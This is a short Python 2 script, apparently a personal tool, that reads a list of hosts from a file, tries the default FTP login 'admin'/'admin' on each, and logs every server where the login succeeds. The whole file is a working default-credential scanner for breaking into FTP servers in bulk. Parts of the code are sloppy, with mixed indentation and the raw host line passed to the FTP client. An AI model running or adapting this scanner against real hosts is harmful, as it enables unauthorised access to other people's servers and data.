import socket
import sys
import re
import ftplib
import socket

username = "admin"
password = "admin"

for server in open("/home/rb/Desktop/Scripts made/Scans/BruteF/PB/HOSTFILE", "r").readlines():
    HOSTNAME = server.strip().split()
    try:
	try:


		ftp = ftplib.FTP(server, timeout=10)
		welcome = (ftp.getwelcome())
		print welcome
		attempt = ftp.login(user=username, passwd=password)
		success = ("[*] Login found " + username + " " + password + " " + server + '\n')
		print("[*] Login found " + username + " " + password + " " + server)
		log_file = open("PYTHONB_LOG.txt", "a")
		log_file.write(success)
		log_file.close()

	except (OSError, EOFError):
	        pass



    except :
	        print "Password not found for " + server
